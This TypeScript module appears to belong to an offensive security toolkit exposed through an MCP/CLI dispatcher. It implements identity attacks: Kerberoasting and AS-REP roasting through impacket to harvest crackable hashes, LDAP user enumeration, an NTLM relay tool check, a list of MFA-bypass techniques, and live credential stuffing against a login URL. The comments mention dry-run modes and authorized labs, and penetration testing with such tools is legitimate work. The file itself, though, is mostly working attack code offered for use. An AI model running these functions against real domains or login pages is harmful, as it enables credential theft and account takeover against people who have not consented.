/**
 * @module identity
 * Identity attacks — Kerberoasting, AS-REP Roasting, MFA bypass, credential
 * abuse, and Entra ID / Azure AD token manipulation.
 */

import { resolveDryRun, resolveLiveMode } from "./exec_options.ts"
import * as crypto from "node:crypto";
import { spawnSync } from "node:child_process";
import * as fs from "node:fs";

// ─── Types ────────────────────────────────────────────────────────────────────

export interface KerberosHashEntry {
  username: string;
  spn: string;
  hashType: "krb5tgs" | "krb5asrep";
  hash: string;
}

export interface MFABypassResult {
  method: string;
  success: boolean;
  sessionToken?: string;
  evidence: string;
  dryRun: boolean;
}

export interface CredentialAbuse {
  vector: string;
  target: string;
  credential: string;
  result: string;
  dryRun: boolean;
}

export interface LdapEnumResult {
  entries: string[];
  baseDn: string;
  dryRun: boolean;
  error?: string;
}

export interface NtlmRelayProbeResult {
  toolAvailable: boolean;
  output: string;
  dryRun: boolean;
}

export interface IdentityOptions {
  live?: boolean;
  dryRun?: boolean;
  domain?: string;
  dcIp?: string;
  username?: string;
  password?: string;
  ntHash?: string;
}

function domainToBaseDn(domain: string): string {
  return domain.split(".").filter(Boolean).map((p) => `DC=${p}`).join(",");
}

function parseKerberoastOutput(text: string): KerberosHashEntry[] {
  const entries: KerberosHashEntry[] = [];
  for (const line of text.split("\n")) {
    if (line.startsWith("$krb5tgs$")) {
      const parts = line.split("$");
      entries.push({ username: parts[4] ?? "", spn: parts[5] ?? "", hashType: "krb5tgs", hash: line.trim() });
    }
  }
  return entries;
}

// ─── Kerberoasting ────────────────────────────────────────────────────────────

/**
 * Request Kerberos TGS tickets for all SPN-bearing accounts and return them
 * in hashcat-ready `$krb5tgs$` format for offline cracking.
 *
 * DRY-RUN: returns empty (no fabricated hashes).
 * LIVE: delegates to `impacket-GetUserSPNs`.
 */
export async function kerberoast(opts: IdentityOptions = {}): Promise<KerberosHashEntry[]> {
  const live = resolveLiveMode(opts);
  const { domain = "CORP.LOCAL", dcIp = "10.0.0.1", username = "", password = "" } = opts;

  if (!live) {
    return [];
  }

  const outFile = `/tmp/ares_kerberoast_${crypto.randomBytes(4).toString("hex")}.txt`;
  const cred = opts.ntHash
    ? `-hashes :${opts.ntHash} ${username}@${dcIp}`
    : `${username}:${password}@${dcIp}`;

  spawnSync(
    "impacket-GetUserSPNs",
    ["-request", "-outputfile", outFile, `${domain}/${cred}`],
    { encoding: "utf8", timeout: 30_000 },
  );

  let combined = "";
  try {
    combined = fs.readFileSync(outFile, "utf8");
  } catch {
    /* output file may be empty when no SPNs */
  } finally {
    try { fs.unlinkSync(outFile); } catch { /* ignore */ }
  }

  return parseKerberoastOutput(combined);
}

// ─── AS-REP Roasting ─────────────────────────────────────────────────────────

/**
 * Request AS-REP tickets for accounts with Kerberos pre-auth disabled.
 * DRY-RUN: empty; LIVE: `GetNPUsers.py` (impacket).
 */
export async function asrepRoast(opts: IdentityOptions = {}): Promise<KerberosHashEntry[]> {
  const live = resolveLiveMode(opts);
  const { domain = "CORP.LOCAL", dcIp = "10.0.0.1" } = opts;

  if (!live) {
    return [];
  }

  const r = spawnSync(
    "impacket-GetNPUsers",
    [`${domain}/`, "-dc-ip", dcIp, "-no-pass", "-request", "-format", "hashcat"],
    { encoding: "utf8", timeout: 30_000 },
  );

  return (r.stdout ?? "").split("\n")
    .filter((l) => l.startsWith("$krb5asrep$"))
    .map((hash) => ({
      username: hash.split("@")[0]?.split("$").slice(-1)[0] ?? "",
      spn: "",
      hashType: "krb5asrep" as const,
      hash,
    }));
}

// ─── LDAP enumeration ─────────────────────────────────────────────────────────

/** Live LDAP user enumeration via ldapsearch (read-only). */
export async function ldapEnumerate(opts: IdentityOptions = {}): Promise<LdapEnumResult> {
  const live = resolveLiveMode(opts);
  const { domain = "CORP.LOCAL", dcIp = "10.0.0.1", username = "", password = "" } = opts;
  const baseDn = domainToBaseDn(domain);

  if (!live) {
    return { entries: [], baseDn, dryRun: true };
  }

  const args = username
    ? [
        "-x", "-H", `ldap://${dcIp}`,
        "-D", `${username}@${domain}`,
        "-w", password,
        "-b", baseDn,
        "(objectClass=user)",
        "sAMAccountName",
      ]
    : [
        "-x", "-H", `ldap://${dcIp}`,
        "-b", baseDn,
        "(objectClass=user)",
        "sAMAccountName",
      ];

  const r = spawnSync("ldapsearch", args, { encoding: "utf8", timeout: 30_000 });
  const entries = (r.stdout ?? "")
    .split("\n")
    .filter((l) => l.startsWith("sAMAccountName:"))
    .map((l) => l.split(":")[1]?.trim() ?? "")
    .filter(Boolean);

  return {
    entries,
    baseDn,
    dryRun: false,
    error: r.status !== 0 && entries.length === 0 ? (r.stderr ?? "ldapsearch failed").slice(0, 200) : undefined,
  };
}

// ─── NTLM relay probe ─────────────────────────────────────────────────────────

/** Verify impacket-ntlmrelayx is on PATH — prerequisite for live relay chains. */
export function ntlmRelayProbe(opts: IdentityOptions = {}): NtlmRelayProbeResult {
  const live = resolveLiveMode(opts);
  if (!live) {
    return { toolAvailable: false, output: "live required", dryRun: true };
  }

  const r = spawnSync("impacket-ntlmrelayx", ["--help"], { encoding: "utf8", timeout: 8000 });
  const output = `${r.stdout ?? ""}${r.stderr ?? ""}`.slice(0, 500);
  const toolAvailable = output.toLowerCase().includes("ntlmrelayx") || r.status === 0;
  return { toolAvailable, output, dryRun: false };
}

// ─── MFA Bypass techniques ────────────────────────────────────────────────────

export const MFA_TECHNIQUES = [
  "SS7_interception",
  "SIM_swap",
  "OTP_brute_force",
  "push_fatigue",
  "real_time_phishing_evilginx",
  "recovery_code_abuse",
  "account_recovery_social_eng",
  "authenticator_app_clone",
];

/**
 * MFA bypass attempt — live paths delegate to authorized lab playbooks only.
 */
export function bypassMFA(
  technique: string,
  target: string,
  opts: IdentityOptions = {},
): MFABypassResult {
  const live = resolveLiveMode(opts);
  const known = MFA_TECHNIQUES.includes(technique);

  if (!live) {
    return {
      method: technique,
      success: false,
      evidence: `DRY-RUN: technique=${technique} target=${target} known=${known}`,
      dryRun: true,
    };
  }

  if (technique === "push_fatigue" || technique === "OTP_brute_force") {
    return {
      method: technique,
      success: false,
      evidence: `Use identity_playbooks.runMfaFatigueProbe with OURMINE_TIER1_MFA_LAB=1 — target=${target}`,
      dryRun: false,
    };
  }

  if (technique === "real_time_phishing_evilginx") {
    return {
      method: technique,
      success: false,
      evidence: `Use evilginx_lab module — Evilginx2 required for ${target}`,
      dryRun: false,
    };
  }

  return {
    method: technique,
    success: false,
    evidence: `live technique ${technique} requires external tooling (known=${known})`,
    dryRun: false,
  };
}

// ─── Credential abuse ─────────────────────────────────────────────────────────

/**
 * Attempt a credential stuffing / spray attack against a target service.
 * DRY-RUN: returns the attempted credentials without network calls.
 */
export async function stuffCredentials(
  targetUrl: string,
  credentials: Array<{ username: string; password: string }>,
  opts: IdentityOptions & { delayMs?: number } = {},
): Promise<CredentialAbuse[]> {
  const live = resolveLiveMode(opts);
  const { delayMs = 500 } = opts;
  const results: CredentialAbuse[] = [];

  for (const cred of credentials) {
    if (!live) {
      results.push({
        vector: "credential_stuffing",
        target: targetUrl,
        credential: `${cred.username}:${"*".repeat(cred.password.length)}`,
        result: "DRY-RUN: not attempted",
        dryRun: true,
      });
      continue;
    }

    try {
      await new Promise((r) => setTimeout(r, delayMs));
      const resp = await fetch(targetUrl, {
        method: "POST",
        headers: { "Content-Type": "application/x-www-form-urlencoded" },
        body: `username=${encodeURIComponent(cred.username)}&password=${encodeURIComponent(cred.password)}`,
        signal: AbortSignal.timeout(10_000),
      });
      results.push({
        vector: "credential_stuffing",
        target: targetUrl,
        credential: `${cred.username}:${"*".repeat(cred.password.length)}`,
        result: resp.ok ? `HTTP ${resp.status} — possible success` : `HTTP ${resp.status} — failed`,
        dryRun: false,
      });
    } catch (e) {
      results.push({ vector: "credential_stuffing", target: targetUrl, credential: cred.username, result: String(e), dryRun: false });
    }
  }

  return results;
}

// ─── Token models ─────────────────────────────────────────────────────────────

export interface EntraToken {
  accessToken: string;
  refreshToken: string;
  expiresIn: number;
  tenantId: string;
  clientId: string;
  scope: string;
}

/**
 * Parse and inspect a raw JWT (access token) for Entra ID / Azure AD details.
 */
export function inspectJWT(token: string): Record<string, unknown> {
  try {
    const parts = token.split(".");
    if (parts.length !== 3) throw new Error("Invalid JWT");
    const payload = JSON.parse(Buffer.from(parts[1], "base64url").toString("utf8"));
    return payload;
  } catch {
    return { error: "Failed to decode JWT" };
  }
}

function kerberoastCommand(opts: IdentityOptions): string {
  const { domain = "CORP.LOCAL", dcIp = "10.0.0.1", username = "", password = "" } = opts;
  const cred = opts.ntHash
    ? `-hashes :${opts.ntHash} ${username}@${dcIp}`
    : `${username}:${password}@${dcIp}`;
  return `impacket-GetUserSPNs -request -outputfile <out> ${domain}/${cred}`;
}

function asrepRoastCommand(opts: IdentityOptions): string {
  const { domain = "CORP.LOCAL", dcIp = "10.0.0.1" } = opts;
  return `impacket-GetNPUsers ${domain}/ -dc-ip ${dcIp} -no-pass -request -format hashcat`;
}

/** MCP/CLI dispatcher for identity attack techniques */
export async function execute(
  req: { domain: string; attack: string; dc?: string; username?: string; password?: string },
  opts: { live?: boolean; dryRun?: boolean } = {},
): Promise<unknown> {
  const identityOpts: IdentityOptions = {
    live: opts.live,
    dryRun: opts.dryRun,
    domain: req.domain,
    dcIp: req.dc || undefined,
    username: req.username,
    password: req.password,
  };
  const live = resolveLiveMode(opts);
  switch (req.attack) {
    case "kerberoast":
      if (!live) {
        return { dryRun: true, command: kerberoastCommand(identityOpts), entries: [] };
      }
      return kerberoast(identityOpts);
    case "asrep_roast":
      if (!live) {
        return { dryRun: true, command: asrepRoastCommand(identityOpts), entries: [] };
      }
      return asrepRoast(identityOpts);
    case "ldap_enum":
      return ldapEnumerate(identityOpts);
    case "mfa_bypass":
      return { mfa: bypassMFA("push_fatigue", req.domain, identityOpts) };
    case "ntlm_relay":
      return ntlmRelayProbe(identityOpts);
    case "credential_spray":
      return stuffCredentials(
        `https://${req.domain}/login`,
        [{ username: req.username ?? "admin", password: req.password ?? "Password1" }],
        identityOpts,
      );
    default:
      return { error: `Unknown attack: ${req.attack}`, dryRun: resolveDryRun(opts) };
  }
}

export default { kerberoast, asrepRoast, ldapEnumerate, ntlmRelayProbe, bypassMFA, stuffCredentials, inspectJWT, execute };
